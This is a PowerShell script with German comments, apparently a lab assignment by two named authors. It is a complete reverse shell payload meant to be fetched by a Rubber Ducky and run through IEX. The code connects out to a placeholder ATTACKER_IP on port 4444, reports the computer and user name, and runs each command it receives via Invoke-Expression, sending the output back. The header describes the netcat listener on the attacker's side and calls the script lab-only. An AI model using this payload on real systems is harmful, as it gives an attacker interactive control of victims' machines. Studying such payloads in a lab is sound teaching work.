# ============================================================
#  W02a.5 – PowerShell Reverse Shell Payload
#  Autoren: Raphael Bleier, Joachim Lugger
#  Wird per IEX vom Rubber Ducky heruntergeladen und ausgeführt
#
#  Voraussetzung:  nc -lvp 4444  (auf Angreifer-Maschine)
#  Ersetze ATTACKER_IP und PORT!
#
#  Funktionsprinzip einer Reverse Shell:
#    Das Opfer-System baut eine ausgehende TCP-Verbindung
#    zum Angreifer auf (umgeht eingehende Firewall-Regeln).
#    Der Angreifer bekommt ein interaktives Shell-Handle.
#
#  WARNUNG: Nur in gesicherter Laborumgebung!
# ============================================================

$ATTACKER_IP = "ATTACKER_IP"
$PORT        = 4444

# TCP-Verbindung zum Angreifer aufbauen
$client = New-Object System.Net.Sockets.TcpClient($ATTACKER_IP, $PORT)
$stream = $client.GetStream()

# Streams für bidirektionale Kommunikation
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

# Begrüßungsnachricht mit System-Info senden
$writer.WriteLine("[+] Reverse Shell verbunden!")
$writer.WriteLine("[+] Host: $env:COMPUTERNAME | User: $env:USERNAME")
$writer.WriteLine("[+] Gib 'exit' ein zum Beenden")
$writer.WriteLine("")

# Read-Execute-Print-Loop (REPL)
while ($client.Connected) {
    $writer.Write("PS $pwd> ")
    $cmd = $reader.ReadLine()

    if ($cmd -eq "exit") { break }

    try {
        # Befehl ausführen und Ausgabe zurücksenden
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        $writer.WriteLine($output)
    } catch {
        $writer.WriteLine("Fehler: $_")
    }
}

# Verbindung sauber schließen
$client.Close()
